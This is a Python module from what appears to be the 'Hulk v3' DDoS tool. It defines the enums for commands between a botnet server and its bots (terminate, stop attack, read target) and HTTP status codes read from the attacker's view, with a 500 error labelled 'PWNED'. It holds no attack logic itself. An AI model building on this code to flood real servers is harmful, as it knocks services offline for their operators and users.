#!/usr/bin/env python3

"""
Hulk v3

This module contains the Enums used in Hulk.
"""

# pylint: disable=duplicate-code
from enum import IntEnum


class ServerCommands(IntEnum):
    """
    The different commands sent by Hulk Server.
    """
    #: Kill the Bot.
    TERMINATE = -1
    #: Stop the attack and go to standby.
    STOP = 0
    #: Please perform a read to get the target address.
    READ_TARGET = 1


class ClientCommands(IntEnum):
    """
    The different commands sent by Hulk Client.
    """
    #: Something went wrong.
    ERROR = -2
    #: Bot Terminated.
    KILLED = -1
    #: Stopped previous attack, on standby.
    STANDBY = 0
    #: Send me the target address.
    SEND_TARGET = 1
    #: Please perform a read to get the status.
    READ_STATUS = 2


class StatusCodes(IntEnum):
    """
    The different HTTP error codes.
    """
    CONNECTION_FAILURE = 69
    NO_LUCK = 200
    ANTI_DDOS = 400
    FORBIDDEN = 403
    NOT_FOUND = 404
    PWNED = 500


class ErrorMessages(IntEnum):
    """
    Error messages during server-client communication.
    """
    CONNECTION_ABORTED = 1
    CONNECTION_REFUSED = 2
    CONNECTION_RESET = 3
